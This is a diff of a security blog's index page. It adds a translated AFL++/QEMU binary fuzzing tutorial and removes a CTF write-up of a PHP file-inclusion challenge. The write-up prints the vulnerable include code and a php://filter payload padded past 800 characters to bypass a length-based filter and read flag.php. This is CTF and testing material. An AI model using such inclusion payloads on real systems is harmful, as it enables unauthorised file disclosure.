+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_HOOK=<span class="string">&quot;<span class="variable">$BASEPATH</span>/src/hook/libhook.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>正如所讨论的，我们希望更改 <code>AFL_QEMU_PERSISTENT_ADDR</code> 为在迭代期间跳过对 <code>read_file</code> 的调用。这里有两个选项：</p>
+<ul>
+<li><p>要么我们把它设置在 <code>base64_decode</code> 起始地址。在这种情况下，我们也将模糊化 <code>base64_decode</code> 函数。</p>
+</li>
+<li><p>或者我们把它设置在 <code>parse_cert_buf</code>。在这种情况下 <code>base64_decode</code>，将不会模糊化。</p>
+<p>因为 <code>base64_decode</code> 是由一个受信任的外部库实现的，我们不想测试它（在本例中是 OpenSSL），所以我们将选择第二个选项。</p>
+</li>
+</ul>
+<p>因此，我们可以将 <code>AFL_QEMU_PERSISTENT_ADDR</code> 移动到以下地址 <code>parse_cert_buf</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert_buf&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_ADDR=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>移动 <code>AFL_QEMU_PERSISTENT_ADDR</code> 对我们的语料库有影响。实际上，由 fuzzer 生成的缓冲区现在直接在中 <code>parse_cert_buf</code> 使用（从未传递给 <code>base64_decode</code>）。这意味着我们必须重建我们的语料库。在我们的例子中，这非常简单：我们只需要从以前的语料库中解码 Base64 文件，并将它们保存为原始二进制文件。</p>
+<h4 id="应用于我们的示例-1"><a href="#应用于我们的示例-1" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>这种方法的一个奇怪之处在于，因为我们不再从文件中读取数据，所以 fuzzer 不再需要在磁盘上创建一个文件。但是，请记住，我们的目标程序期望从其中读取，否则它将立即退出。由于该文件的内容不再相关（因为 <code>read_file</code> 不再调用），我们可以在调用程序之前手动创建一个空的占位符。</p>
+<p>你可以在中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4">step4 文件夹</a>找到此新设置。</p>
+<h3 id="对性能的影响-1"><a href="#对性能的影响-1" class="headerlink" title="对性能的影响"></a>对性能的影响</h3><p>总的来说，在我们的测试中，启用持续模式可以将性能提高 10 倍（但在实际场景中不要总是期望有这样的提升！），而内存中的钩子可以产生额外的双重改进：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 25.6k/sec</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong> 由于执行速度并不是唯一重要的指标，你当然应该关注其他指标，如稳定性、新发现的路径、覆盖率等。</p>
+<h2 id="语法感知器（step5）"><a href="#语法感知器（step5）" class="headerlink" title="语法感知器（step5）"></a>语法感知器（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step5">step5</a>）</h2><h3 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h3><p>回顾一下我们迄今所取得的成就：</p>
+<ul>
+<li>我们将 AFL++ 设置为使用 QEMU 来模糊仅二进制目标。</li>
+<li>我们将工具配置为仅覆盖相关地址；</li>
+<li>我们调整了 AFL++ 入口点，并启用了持续模式以减少初始化时间。</li>
+</ul>
+<p>在许多情况下，这样的配置（当与我们稍后将简要介绍的多处理相结合时）足以运行成功的活动。但是，在本例中，我们决定模糊处理高度结构化数据格式的目标。在这种情况下，引入改变输入数据的新方法可能是有趣的。</p>
+<p>事实上，AFL++ 的另一个可调方面是生成和突变逻辑。AFL++ 内置了对一组简单（但非常有效）的突变的支持：</p>
+<ul>
+<li>随机比特翻转</li>
+<li>随机字节翻转</li>
+<li>运算</li>
+<li>等等</li>
+</ul>
+<p>在大多数情况下，这些突变足以探索模糊的代码。某些数据格式具有内部约束，这些约束将导致样本因不满足这些约束而被过早拒绝。例如，我们的示例中使用的格式 ASN.1 就是这种情况：在不考虑这些约束的情况下生成突变可能会导致大多数样本被目标立即视为无效而丢弃，而不会实现任何额外的覆盖。这意味着 Fuzzing Campaign <strong>汇聚前需要时间</strong>生成相关案例。</p>
+<p>为了解决这种情况，AFL++ 允许用户提供他们自己的自定义变异体，以引导 Fuzzer 生成更适合的输入。如<a target="_blank" rel="noopener" href="https://aflplus.plus/docs/custom_mutators">官方文档</a>中所述，<strong>AFL++可插入自定义 Mutator</strong> ，只要此Mutator实现了所需的 API 函数。</p>
+<h3 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h3><p>有几个选项可以在 AFL++ 中实现语法感知的转变器，其中之一是<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">AFL++ 项目的语法变异器部分</a>。然而，由于它不提供对 ASN.1 的支持，我们转而依赖于<a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator">libprotobuf</a>来<a target="_blank" rel="noopener" href="https://github.com/google/fuzzing/tree/master/proto/asn1-pdu">处理 ASN.1</a>。</p>
+<p>我们从<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/custom_mutators.md">官方文档</a>中获得了灵感，并在 AFL++<a target="_blank" rel="noopener" href="https://github.com/P1umer/AFLplusplus-protobuf-mutator">现有骨架</a> 和我们的自定义 Mutator 之间建立了“粘合剂”。</p>
+<p>结果存在于中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/custom_mutator.cpp">custom_mutator.cpp</a>，并实现来自 AFL++API 的以下函数：</p>
+<ul>
+<li><code>afl_custom_init</code>: 初始化我们自定义的 mutator</li>
+<li><code>afl_custom_fuzz</code>: 用protobuf mutator 对输入进行变异</li>
+<li><code>afl_custom_post_process</code> 对变异数据执行后处理，以确保我们的目标接收到正确格式化的输入</li>
+<li><code>afl_custom_deinit</code> 清理所有东西</li>
+</ul>
+<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h3><p>实际上，该 <code>afl_custom_post_process</code> 函数起着重要的作用：我们的自定义 mutator 基于 libprotobuf，因此需要 protobuf 数据作为输入。然而，我们的目标只能解析 ASN.1 数据，因此我们需要将数据从 Protobuf 转换为 ASN.1. 幸运的是，protobuf mutator 已经在中 <code>x509_certificate::X509CertificateToDER</code> 实现了此功能。</p>
+<p>整个过程概述如下：</p>
+<p><img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/afl++-protobuf-asn1.svg" alt="PROTOBUF 到 ASN1"></p>
+<p>和以前一样，我们需要调整语料库中文件的格式，以与我们的 Fuzzing 工具保持一致。这一次，我们需要将 ASN.1 DER 文件转换为 Protobuf.为此，我们实现了一个自定义脚本（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/asn1_to_protobuf.py"><em>protobuf.py 的 ASN1</em></a>），该脚本在此步骤<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4/build_corpus.sh">build_corpus.sh</a>中运行一次。</p>
+<h4 id="环境变量-2"><a href="#环境变量-2" class="headerlink" title="环境变量"></a>环境变量</h4><p>有了这个，剩下的就是指示 AFL++ 使用我们的自定义 Mutator.为此，我们只需设置 <code>AFL_CUSTOM_MUTATOR_LIBRARY</code> 文件的 <code>.so</code> 路径：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_LIBRARY=<span class="string">&quot;<span class="variable">$BASEPATH</span>/libmutator.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们还禁用 AFL++ 执行的所有默认突变和修剪：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_DISABLE_TRIM=1</span><br><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_ONLY=1</span><br></pre></td></tr></table></figure>
+
+<h4 id="应用于我们的示例-2"><a href="#应用于我们的示例-2" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>你可以在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step5">step5 文件夹</a>中找到此新设置。</p>
+<h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>这一次，它不是为了提高性能，而是为了达到更深的路径。在我们的例子中，这是一个非常小的目标，很难衡量这种影响。但是，这通常是通过比较覆盖率并检查是否使用自定义赋值函数到达新分支来完成的。</p>
+<p>但是，你不需要在使用自定义 Mutator 和使用默认的 AFL++ 突变之间进行选择：你可以通过运行 Fuzzer 的多个实例来实现两全其美，我们将在下一步中讨论这一点。</p>
+<h2 id="多处理（step6）"><a href="#多处理（step6）" class="headerlink" title="多处理（step6）"></a>多处理（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">step6</a>）</h2><p>这一步是我们把所有的东西放在一起来运行我们实际的模糊运动。事实上，在真正的活动中，你不会限制自己只在一个核心&#x2F;线程&#x2F;机器上进行模糊测试。幸运的是，AFL++ 处理并行运行多个实例。</p>
+<p>但是，如<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#c-using-multiple-cores">文档</a>中所述，一次运行太多实例并不总是有用的：</p>
+<blockquote>
+<p>在同一台机器上 由于 AFL++ 的设计，有一个有用的 CPU 核心&#x2F;线程的最大数量，使用更多和整体性能反而会下降。此值取决于目标和限制在每台机器 32 到 64 个核心之间</p>
+</blockquote>
+<p>需要注意的是，即使在达到该限制之前，性能的提高也不是成比例的（内核数量加倍并不会使每秒执行次数加倍）：同步进程需要额外的开销。</p>
+<h3 id="不同的配置、变量、时间表"><a href="#不同的配置、变量、时间表" class="headerlink" title="不同的配置、变量、时间表"></a>不同的配置、变量、时间表</h3><p>当运行 Fuzzer 的多个实例时，可以通过并行使用各种策略和配置来优化覆盖率。因为我们的目的不是反映官方的 AFL++ 文档，我们将参考你的文档，<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#c-using-multiple-cores">这一节</a>该文档描述了如何在 Fuzzing 时使用多个内核。</p>
+<p>然而，由于该页面主要针对源代码可用的 Fuzzing 目标，因此需要对某些方面进行调整，以便只进行二进制 Fuzzing.</p>
+<h3 id="仅限二进制的特性"><a href="#仅限二进制的特性" class="headerlink" title="仅限二进制的特性"></a>仅限二进制的特性</h3><p>当对源代码可用的目标进行模糊处理时，许多功能（例如 ASAN、UBSAN、CFISAN、COMPCOV）需要使用特定选项重新编译目标。尽管在处理二进制目标时不能选择重新编译，但其中一些特性在 QEMU 中仍然可用（如文档所述<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md#qemu-mode">here</a>）。</p>
+<p>例如， <code>AFL_USE_QASAN</code> 允许使用 <code>LD_PRELOAD</code> 自动注入库来使用<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/libqasan/README.md">使用 QEMU 的 ASAN</a>。类似地， <code>AFL_COMPCOV_LEVEL</code> 允许使用<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/libcompcov/README.md">带有 QEMU 的 CompCov</a>，而无需重新编译目标。</p>
+<h3 id="多设备设置"><a href="#多设备设置" class="headerlink" title="多设备设置"></a>多设备设置</h3><p>对于较大的 Fuzzing 活动，你可以使用多个主机，每个主机运行多个 Fuzzer 进程。此设置实际上相当简单，并且在中<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#d-using-multiple-machines-for-fuzzing">官方文档</a>有详细介绍。为了简单和可重复性，我们没有在这篇文章中使用多台机器。</p>
+<h3 id="应用于我们的示例-3"><a href="#应用于我们的示例-3" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h3><p>从这篇博文开始，输入格式和目标函数就发生了变化。你可以在下表中找到这些更改的摘要：</p>
+<table>
+<thead>
+<tr>
+<th>Configuration</th>
+<th>Targeted function</th>
+<th>预期的输入格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Default entrypoint</td>
+<td><code>main()</code></td>
+<td><code>base64(ASN.1)</code></td>
+</tr>
+<tr>
+<td>Custom entrypoint</td>
+<td><code>main()</code></td>
+<td><code>base64(ASN.1)</code></td>
+</tr>
+<tr>
+<td>In-memory fuzzing</td>
+<td><code>parse_cert_buf()</code></td>
+<td><code>ASN.1/ DER</code></td>
+</tr>
+<tr>
+<td>Custom mutator</td>
+<td><code>parse_cert_buf()</code></td>
+<td><code>protobuf</code> -&gt; <code>ASN.1</code></td>
+</tr>
+</tbody></table>
+<p>在这一步中，我们运行了一个带有自定义赋值函数的实例，以及几个没有该赋值函数的实例。因此，我们需要 ASN.1（ <code>corpus_unique</code>）中的一个语料库和 protobuf（ <code>corpus_protobuf_unique</code>）中的一个语料库，以及单独的输出目录。</p>
+<p>中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">step6 文件夹</a>提供了这种多语料库设置的示例。请注意，与其他步骤相反，最有趣的更改是在 <code>fuzz.sh</code> 文件中，而不是在中 <code>afl_config.sh</code>。</p>
+<h2 id="评估活动"><a href="#评估活动" class="headerlink" title="评估活动"></a>评估活动</h2><p>在开始一项活动后，你可能需要对其进行监控，评估其效率，并调查其结果。这超出了这篇文章的范围，并<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md">正式文件</a>给出了各种细节，我们不打算在这里重复。然而，为了给你一个概念，我们将快速浏览其中的一些问题。</p>
+<h3 id="监视活动"><a href="#监视活动" class="headerlink" title="监视活动"></a>监视活动</h3><p>AFL++ 提供以下工具来监控运行实例的状态：</p>
+<ul>
+<li><code>afl-whatsup</code>，显示在后台运行的 Fuzzer 实例的状态：</li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ afl-whatsup -s output</span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line">       Fuzzers alive : 4</span><br><span class="line">      Total run time : 4 minutes, 0 seconds</span><br><span class="line">         Total execs : 1 millions, 849 thousands</span><br><span class="line">    Cumulative speed : 30829 execs/sec</span><br><span class="line">       Average speed : 7707 execs/sec</span><br><span class="line">       Pending items : 0 faves, 0 total</span><br><span class="line">  Pending per fuzzer : 0 faves, 0 total (on average)</span><br><span class="line">       Crashes saved : 3</span><br><span class="line">Cycles without finds : 204/26/1066/264</span><br><span class="line">  Time without finds : 1 minutes, 26 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>afl-plot</code>，它可以绘制特定实例的指标随时间的演变：</li>
+</ul>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-plot output/afl-main /tmp/plot</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/afl-plot.png" alt="AFL-PLOT 输出示例"></p>
+<h3 id="测量覆盖率"><a href="#测量覆盖率" class="headerlink" title="测量覆盖率"></a>测量覆盖率</h3><p>检查覆盖范围是另一回事，对于只有二进制的目标有各种特殊性。这超出了这篇文章的范围，但你可以找到有趣的资源<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#g-checking-the-coverage-of-the-fuzzing">在官方文件中</a>。</p>
+<p>OUR<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">Step6 文件夹</a>上下文中的典型命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -Q -C -i <span class="string">&quot;<span class="variable">$output_path</span>&quot;</span>/afl-main/queue -o afl-main.cov -- <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span> /tmp/.afl_fake_input</span><br></pre></td></tr></table></figure>
+
+<h3 id="检查崩溃和超时"><a href="#检查崩溃和超时" class="headerlink" title="检查崩溃和超时"></a>检查崩溃和超时</h3><p>一旦 AFL++ 识别出崩溃或挂起，它将把触发它的输入保存在输出目录中的专用文件夹中，以便你可以重现它。</p>
+<p>理解这些结果的有用工具可以是：</p>
+<ul>
+<li><code>afl-tmin</code> 以获得再现崩溃的最小测试用例</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>探索特定案例的覆盖范围</li>
+<li><a target="_blank" rel="noopener" href="https://valgrind.org/">Valgrind</a>调查内存问题</li>
+<li>可能还有更多！</li>
+</ul>
+<p>此外，对于自定义 Mutator 发现的情况，输入将采用 Protobuf 格式，这不容易直接在目标上重放。为此，我们实现了一个简单的程序，它允许将 protobuf 转换回 ASN.1（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/protobuf_to_der.cpp">protobuf_to_der.CPP</a>）</p>
+<h2 id="到目前为止我们所做的"><a href="#到目前为止我们所做的" class="headerlink" title="到目前为止我们所做的"></a>到目前为止我们所做的</h2><p>在这篇文章中，我们的目标是强调我们的方法，解释 AFL++ 的概念，并为 Fuzz 二进制目标提供一个框架。这导致我们根据我们的目标和我们自己的经验做出选择，这在其他情况下可能并不相关。特别地，其他语法变异体可能更容易实现（例如<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">语法变异器</a>，如果它支持正确的语法）。</p>
+<p>然而，通过配置内存中的持续性、调整定制的语法感知突变以及实现多处理，我们实现了以有趣的执行速度和覆盖范围运行 Fuzzing 活动。</p>
+<p>显然，这只是故事的开始：运行 Fuzzing 活动本身和分析结果都有自己的一套新问题和乐趣！</p>
+<h2 id="参考书目"><a href="#参考书目" class="headerlink" title="参考书目"></a>参考书目</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li>AFL++-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a></li>
+<li>QEMU-<a target="_blank" rel="noopener" href="https://gitlab.com/qemu-project/qemu">https://gitlab.com/qemu-project/qemu</a></li>
+<li>语法变异器，AFL++ 基于语法的自定义变异器-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">https://github.com/AFLplusplus/Grammar-Mutator</a></li>
+<li>Nautilus，基于语法的 Fuzzer，支持 AFL-QEMU-<a target="_blank" rel="noopener" href="https://github.com/nautilus-fuzz/nautilus">https://github.com/nautilus-fuzz/nautilus</a></li>
+<li>AFL++Protobuf Mutator 骨架-<a target="_blank" rel="noopener" href="https://github.com/P1umer/AFLplusplus-protobuf-mutator">https://github.com/P1umer/AFLplusplus-protobuf-mutator</a></li>
+</ul>
+<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ul>
+<li>AFL++ 文档-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md</a></li>
+<li>AFL++ 关于二进制 Fuzzing 的文档-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md</a></li>
+<li>关于 QEMU 内部的一系列帖子-<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/qemu_blog">https://airbus-seclab.github.io/qemu_blog</a></li>
+<li>成功模糊的种子选择-<a target="_blank" rel="noopener" href="https://hexhive.epfl.ch/publications/files/21ISSTA2.pdf">https://hexhive.epfl.ch/publications/files/21ISSTA2.pdf</a></li>
+<li>模糊测试：为 AFL<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/fuzz-testing-choosing-a-seed-file-for-afl-fee4a09753c2">https://medium.com/fuzzstation/fuzz-testing-choosing-a-seed-file-for-afl-fee4a09753c2</a>选择种子文件</li>
+<li>应对哪些应用程序进行模糊测试？-<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/what-applications-should-be-fuzz-tested-e83c77aec84a">https://medium.com/fuzzstation/what-applications-should-be-fuzz-tested-e83c77aec84a</a></li>
+<li>准备申请 AFL-Fuzz-<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/preparing-an-application-for-afl-fuzz-a2a838c949cb">https://medium.com/fuzzstation/preparing-an-application-for-afl-fuzz-a2a838c949cb</a></li>
+<li>AFL 变异图工具-<a target="_blank" rel="noopener" href="https://github.com/adrianherrera/afl-mutation-graph">https://github.com/adrianherrera/afl-mutation-graph</a></li>
+<li>模糊书：灰盒模糊-<a target="_blank" rel="noopener" href="https://www.fuzzingbook.org/html/GreyboxFuzzer.html">https://www.fuzzingbook.org/html/GreyboxFuzzer.html</a></li>
+<li>AFL++：结合模糊研究的增量步骤，对 AFL++ 概念（例如分叉服务器）进行了很好的解释-<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/woot20-paper-fioraldi.pdf">https://www.usenix.org/system/files/woot20-paper-fioraldi.pdf</a></li>
+<li>如何使用 QEMU（和 AFL）进行模糊处理-<a target="_blank" rel="noopener" href="https://galtashma.com/posts/how-fuzzing-with-qemu-and-afl-work">https://galtashma.com/posts/how-fuzzing-with-qemu-and-afl-work</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2023/07/20/AFL-QEMU/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" >SWPUCTF2022-easyupload3-wp</a>
 								</h3>
 							</div>
@@ -683,44 +1036,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/11/鹏城杯2022-简单包含-wp/" >鹏城杯2022-简单包含-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-11
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2422">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="伪协议查看flag"><a href="#伪协议查看flag" class="headerlink" title="伪协议查看flag"></a>伪协议查看flag</h3><p>发现被过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看index源码"><a href="#查看index源码" class="headerlink" title="查看index源码"></a>查看index源码</h3><p>当输入长度小于800时 过滤flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?flag=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="最后发送字符数-gt-800-然后查看flag"><a href="#最后发送字符数-gt-800-然后查看flag" class="headerlink" title="最后发送字符数&gt;800 然后查看flag"></a>最后发送字符数&gt;800 然后查看flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/11/鹏城杯2022-简单包含-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -782,7 +1097,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>7</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>51</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>52</span></a></li>
 		
 		</ul>
 	</div>
@@ -793,45 +1108,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
 		
-			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
+			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
 		
 			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
 		
-			<li><a href="/tags/sql/">sql<span>8</span></a></li>
-		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
-		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
-		
-			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
-		
